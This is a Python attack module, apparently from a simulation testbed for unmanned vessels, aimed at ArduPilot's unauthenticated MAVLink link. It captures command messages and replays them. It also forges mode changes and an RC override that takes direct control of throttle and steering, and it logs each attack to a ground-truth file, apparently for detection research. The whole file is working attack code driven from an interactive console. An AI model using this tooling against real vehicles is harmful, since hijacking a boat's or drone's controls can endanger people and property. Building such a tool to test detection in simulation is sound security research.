"""
C2 replay/MITM attack module.

Different threat model from GPS/AIS spoofing: those manipulated what the
vessel PERCEIVES (sensor data). This manipulates COMMAND AUTHORITY --
either replaying previously-captured legitimate commands out of context,
or injecting entirely forged commands the "attacker" crafts directly.
Because MAVLink in default SITL config has no signing/authentication,
ArduPilot cannot distinguish a legitimate GCS from this script.

PREREQUISITE (run once per SITL session, in the MAVProxy console):
    output add 127.0.0.1:14553
This gives this script its own MAVLink endpoint, separate from the
dashboard (which listens on 14551) and auto_mission.py (14552) -- avoids
a port conflict, no need to touch start_sitl.sh. See constants.py for
the full port map.

Requires: pymavlink (already used elsewhere in this project)
"""

import sys
import time
import threading
import csv
import os
from pymavlink import mavutil

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import constants

MAVLINK_ENDPOINT = f"udpin:127.0.0.1:{constants.MAVLINK_C2_REPLAY_PORT}"

ATTACK_LOG_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "attack_logs", "c2_replay_ground_truth.csv")

os.makedirs(os.path.dirname(ATTACK_LOG_PATH), exist_ok=True)
_log_lock = threading.Lock()


def log_attack_event(wall_ts, attack_type, description):
    with _log_lock:
        write_header = not os.path.exists(ATTACK_LOG_PATH)
        with open(ATTACK_LOG_PATH, "a", newline="") as f:
            w = csv.writer(f)
            if write_header:
                w.writerow(["wall_ts", "attack_type", "description"])
            w.writerow([wall_ts, attack_type, description])


# --- Connection ------------------------------------------------------------

def connect():
    print(f"Connecting to {MAVLINK_ENDPOINT} ...")
    conn = mavutil.mavlink_connection(MAVLINK_ENDPOINT)
    print("Waiting for heartbeat (confirms this endpoint is live and "
          "ArduPilot/MAVProxy is forwarding to it) ...")
    msg = conn.wait_heartbeat(timeout=15)
    if msg is None:
        print(f"ERROR: no heartbeat received on {MAVLINK_ENDPOINT} within 15s. "
              f"Did you run 'output add 127.0.0.1:{constants.MAVLINK_C2_REPLAY_PORT}' "
              f"in the MAVProxy console for this SITL session?")
        sys.exit(1)
    print(f"Heartbeat received from system {conn.target_system}, "
          f"component {conn.target_component}. Connection confirmed live.")
    return conn


# --- Capture mode ------------------------------------------------------------

captured_messages = []  # list of (timestamp, msg_type, raw_bytes, summary)


def run_capture(conn, stop_event, duration_s=None):
    """Passively logs command-relevant MAVLink messages for later replay.
    Focuses on COMMAND_LONG (arm/disarm, mode changes issued this way),
    SET_MODE, and MISSION_ITEM/MISSION_ITEM_INT (waypoint commands)."""
    interesting_types = {"COMMAND_LONG", "SET_MODE", "MISSION_ITEM",
                          "MISSION_ITEM_INT", "RC_CHANNELS_OVERRIDE"}
    print(f"Capturing C2 traffic (types: {interesting_types})...")
    start = time.time()
    while not stop_event.is_set():
        if duration_s and (time.time() - start > duration_s):
            break
        msg = conn.recv_match(blocking=True, timeout=1.0)
        if msg is None:
            continue
        msg_type = msg.get_type()
        if msg_type in interesting_types:
            raw = msg.get_msgbuf()
            summary = msg.to_dict()
            captured_messages.append((time.time(), msg_type, raw, summary))
            print(f"Captured: {msg_type} -- {summary}")
            log_attack_event(time.time(), "capture", f"{msg_type}: {summary}")
    print(f"Capture stopped. {len(captured_messages)} messages captured.")


# --- Replay mode -------------------------------------------------------------

def run_replay(conn, delay_before_s=5.0):
    """Resends previously captured raw MAVLink messages, verbatim, after
    a delay -- simulating replaying a legitimate command out of its
    original context (e.g. an old ARM or mode-change command resent
    later when conditions have changed)."""
    if not captured_messages:
        print("No captured messages to replay. Run 'capture' first.")
        return
    print(f"Replaying {len(captured_messages)} captured messages after "
          f"{delay_before_s}s delay...")
    time.sleep(delay_before_s)
    for ts, msg_type, raw, summary in captured_messages:
        conn.write(raw)
        print(f"Replayed: {msg_type} -- {summary}")
        log_attack_event(time.time(), "replay", f"{msg_type}: {summary}")
        time.sleep(0.1)
    print("Replay complete.")


# --- Forged command injection -----------------------------------------------

def inject_forged_mode_change(conn, target_mode="HOLD"):
    """Sends a forged mode-change command not derived from any capture --
    a fabricated command an attacker with MAVLink access could send
    directly, with no prior legitimate traffic needed."""
    mode_id = conn.mode_mapping().get(target_mode)
    if mode_id is None:
        print(f"Unknown mode '{target_mode}'. Available: {list(conn.mode_mapping().keys())}")
        return
    conn.mav.set_mode_send(conn.target_system,
                            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                            mode_id)
    print(f"Injected forged mode-change command: -> {target_mode}")
    log_attack_event(time.time(), "inject_mode", f"forged mode change to {target_mode}")


def inject_forged_rc_override(conn, throttle_pwm=1700, steering_pwm=1500, duration_s=5.0):
    """Directly seizes control via RC_CHANNELS_OVERRIDE -- this bypasses
    perception entirely (no sensor lied to) and commands actuators
    directly, which should move the vessel's TRUE Gazebo position, not
    just its believed one. This is the clearest signature distinguishing
    C2 injection from GPS/AIS spoofing when this shows up on the
    dashboard later."""
    print(f"Injecting forged RC override: throttle={throttle_pwm}, "
          f"steering={steering_pwm}, for {duration_s}s...")
    end = time.time() + duration_s
    while time.time() < end:
        conn.mav.rc_channels_override_send(
            conn.target_system, conn.target_component,
            steering_pwm, 0, throttle_pwm, 0, 0, 0, 0, 0)
        time.sleep(0.2)
    # release override (send zeros, which RC_CHANNELS_OVERRIDE treats as "ignore")
    conn.mav.rc_channels_override_send(
        conn.target_system, conn.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
    print("RC override released.")
    log_attack_event(time.time(), "inject_rc_override",
                      f"throttle={throttle_pwm}, steering={steering_pwm}, {duration_s}s")


# --- Interactive control -----------------------------------------------------

def main():
    conn = connect()
    stop_event = threading.Event()
    capture_thread = None

    print("\nCommands:")
    print("  capture       - start passively capturing C2 traffic")
    print("  stopcapture   - stop capturing")
    print("  replay        - replay captured messages after a delay")
    print("  mode <NAME>   - inject forged mode change (e.g. 'mode HOLD')")
    print("  rc             - inject forged RC override (seizes control directly)")
    print("  quit\n")

    while True:
        cmd = input("> ").strip()
        parts = cmd.split()
        if not parts:
            continue
        action = parts[0].lower()

        if action == "capture":
            stop_event.clear()
            capture_thread = threading.Thread(
                target=run_capture, args=(conn, stop_event), daemon=True)
            capture_thread.start()
        elif action == "stopcapture":
            stop_event.set()
            if capture_thread:
                capture_thread.join(timeout=2)
        elif action == "replay":
            run_replay(conn)
        elif action == "mode" and len(parts) > 1:
            inject_forged_mode_change(conn, parts[1].upper())
        elif action == "rc":
            inject_forged_rc_override(conn)
        elif action == "quit":
            os._exit(0)
        else:
            print("Unknown command.")


if __name__ == "__main__":
    main()
